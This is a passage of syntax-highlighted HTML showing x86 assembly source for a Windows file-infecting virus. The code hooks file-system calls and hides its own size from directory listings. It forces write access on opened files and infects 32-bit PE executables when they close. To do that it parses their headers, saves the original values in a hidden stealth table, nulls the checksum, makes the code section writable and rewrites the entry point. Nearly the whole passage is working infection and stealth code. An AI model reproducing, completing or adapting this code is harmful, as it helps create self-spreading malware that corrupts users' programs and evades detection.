</span><span class="sc1">;*********************************************************</span><span class="sc0">


</span><span class="sc5">FileWrite</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fsd_write</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">next_ifs_hook</span><span class="sc0">
</span><span class="sc5">FileTime</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fsd_filetime</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">next_ifs_hook</span><span class="sc0">

</span><span class="sc1">;*********************************************************</span><span class="sc0">
</span><span class="sc1">;*                           *</span><span class="sc0">
</span><span class="sc1">;* FindFirst and FindNext filesize stealth,      *</span><span class="sc0">
</span><span class="sc1">;*********************************************************</span><span class="sc0">

</span><span class="sc5">FindFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">next_hooker</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">edi.ir_data</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.nFileSizeLow</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; EAX holds filesize</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0">       </span><span class="sc1">; subtract virus' aligned size (virus size/103+1*103)</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">file_align</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">xx_ifs_ret</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.nFileSizeLow</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">xx_ifs_ret</span><span class="sc0">

</span><span class="sc1">;*********************************************************</span><span class="sc0">
</span><span class="sc1">;*                           *</span><span class="sc0">
</span><span class="sc1">;* Open file: set read/write access to all opened    *</span><span class="sc0">
</span><span class="sc1">;* files.                        *</span><span class="sc0">
</span><span class="sc1">;*********************************************************</span><span class="sc0">


    </span><span class="sc1">;/* Set read/write access to the opened file, so we can infect it on closing */</span><span class="sc0">

</span><span class="sc5">FileOpen</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ir_options</span><span class="sc4">],</span><span class="sc5">ACTION_OPENEXISTING</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">next_ifs_hook</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ir_flags</span><span class="sc4">],</span><span class="sc5">ACCESS_READWRITE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">ACCESS_EXECUTE</span><span class="sc0">   </span><span class="sc1">; full access...</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next_ifs_hook</span><span class="sc0">





</span><span class="sc1">;********************************************************</span><span class="sc0">
</span><span class="sc1">;*                          *</span><span class="sc0">
</span><span class="sc1">;* Infect closing files by writing virus to the     *</span><span class="sc0">
</span><span class="sc1">;* open handle (before closing ofcourse)        *</span><span class="sc0">
</span><span class="sc1">;********************************************************</span><span class="sc0">

    </span><span class="sc1">;/* Check if we have both the read and write FSD functions stored */</span><span class="sc0">

</span><span class="sc5">FileClose</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fsd_read</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">ret_hook</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fsd_write</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">ret_hook</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">next_ifs_hook</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ir_ppath</span><span class="sc4">],</span><span class="sc2">0FFFFFBBBh</span><span class="sc0">   </span><span class="sc1">; is IO request is valid?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">next_ifs_hook</span><span class="sc0">

    </span><span class="sc1">;/* Check if the closing file is an MZ executable */</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; read from position 0</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileBuffer</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; read into this buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">             </span><span class="sc1">; length of buffer to read</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FSD</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">next_ifs_hook</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'xxZM'</span><span class="sc0">      </span><span class="sc1">; prepared goat file?</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">     </span><span class="sc1">; MZ executable?</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">


        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">next_ifs_hook</span><span class="sc0">           </span><span class="sc1">; return if not..</span><span class="sc0">

    </span><span class="sc1">;/* Get the file's "last modified" timestamp */</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fsd_filetime</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">forget_time</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">our_ioreq</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.ir_flags</span><span class="sc4">],</span><span class="sc5">GET_MODIFY_DATETIME</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">edi.ir_rh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.ir_rh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">edi.ir_fh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.ir_fh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; get last modified time</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">eax.ir_aux2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddFileTime</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">forget_time</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc1">;_________________________________ (infection algorithm)</span><span class="sc0">

    </span><span class="sc1">;/* Check if the closing file is an 32-bit Portable Executable */</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; get pointer to NewExe header</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">           </span><span class="sc1">; corrupt pointer?</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">next_ifs_hook</span><span class="sc0">           </span><span class="sc1">; return if corrupt.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PE_RVA</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">800h</span><span class="sc0">            </span><span class="sc1">; read 800h bytes at offset ECX into EDX buffer</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FSD</span><span class="sc0">             </span><span class="sc1">; using direct FSD access..</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">next_ifs_hook</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">     </span><span class="sc1">; is it a PE header?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">next_ifs_hook</span><span class="sc0">           </span><span class="sc1">; return if not 32-bit Portable Executable</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; infected?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">next_ifs_hook</span><span class="sc0">

    </span><span class="sc1">;/* Check if a library file (as in DLL) */</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">AVOIDDLL</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">edx.IFH_Characteristics</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">next_ifs_hook</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; mark header infected</span><span class="sc0">

    </span><span class="sc1">;/* Gather information from PE header and null checksum */</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">edx.IFH_TimeDateStamp</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; store time stamp (for encryption, as a part of the key)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CryptKey</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">edx.NTOH_FileAlignment</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; store file alignement</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Alignement</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">edx.NTOH_EntryPointRVA</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; EntryPoint RVA...</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EntryPointRVA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">edx.NTOH_SizeOfCode</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; code size..</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CodeSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">edx.NTOH_SizeOfImage</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; ImageSize</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ImageSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">edx.NTOH_CheckSum</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Checksum</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CheckSum</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NTOH_CheckSum</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; Null checksum (linker default)</span><span class="sc0">

    </span><span class="sc1">;/* Locate the Object headers in PE structure */</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">edx.NTOH_EntryPointRVA</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; ESI holds EP RVA</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.IFH_SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; EAX = NT header size</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">              </span><span class="sc1">; + Image file header</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.IFH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; get nr. of sections</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; +1 empty section</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">          </span><span class="sc1">; multiply it with section header size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; EAX = RVA/offset to virus stealth data area (from PE header)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; EAX pts to virus stealth data area in memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">StealthData</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">              </span><span class="sc1">; EAX = Object Table position -40</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc1">;/* Check if host PE header contains anough free space for our stealth table */</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">StealthData</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">stealth_table_size</span><span class="sc0">
</span><span class="sc5">chk_table_space</span><span class="sc4">:</span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">stack_fix_3</span><span class="sc0">         </span><span class="sc1">; Exit with stackfix if PE header does not contain a cave</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">chk_table_space</span><span class="sc0">         </span><span class="sc1">; big anough for our stealth table.</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc1">;/* Locate CODE section, wich is, the section EntryPoint RVA points inside */</span><span class="sc0">

</span><span class="sc5">find_code</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.ObjectName</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">next_ifs_hook</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edx.RVA</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; get start RVA of section</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">find_code</span><span class="sc0">           </span><span class="sc1">; try again if EntryPoint RVA is below section RVA</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edx.PhysicalSize</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; get end RVA of section</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">find_code</span><span class="sc0">           </span><span class="sc1">; try again if EntryPoint RVA points to after end RVA</span><span class="sc0">

    </span><span class="sc1">;/* Check if CODE section contains a big anough cave for our loader */</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edx.VirtualSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edx.PhysicalSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">patchsize</span><span class="sc0">           </span><span class="sc1">; is the virus' patch size bigger than gap between Vsize and Psize?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">next_ifs_hook</span><span class="sc0">           </span><span class="sc1">; exit infection if cave in CODE section is too small</span><span class="sc0">

    </span><span class="sc1">;/* Get last section header */</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">get_last_sec</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">              </span><span class="sc1">; get first/next section header</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.Flags</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; reached end of section headers?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">got_last_hdr</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">ecx.PhysicalOffset</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; is ESI below this offset</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">get_last_sec</span><span class="sc0">            </span><span class="sc1">; if not, check next</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">ecx.PhysicalOffset</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; ESI = Offset of this section</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; EDI points to this section header</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">get_last_sec</span><span class="sc0">
</span><span class="sc5">got_last_hdr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; ESI holds FSD write function</span><span class="sc0">
                            </span><span class="sc1">; EDX pts to CODE section header</span><span class="sc0">
                            </span><span class="sc1">; ECX pts to last section header</span><span class="sc0">

    </span><span class="sc1">;/* Store original copies of infected object headers and PE header values in virus' stealth table */</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">StealthData</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileBuffer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">; store PE RVA of last section</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">; store PE RVA of CODE section</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.NTOH_EntryPointRVA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ImageSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc1">;/* Set write bit to CODE section (to write decryption) */</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.Flags</span><span class="sc4">],</span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc0">

    </span><span class="sc1">;/* Set new EntryPoint RVA */</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileBuffer</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; EBX pts to PE header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edx.RVA</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; EAX holds RVA of code section</span><span class="sc0">
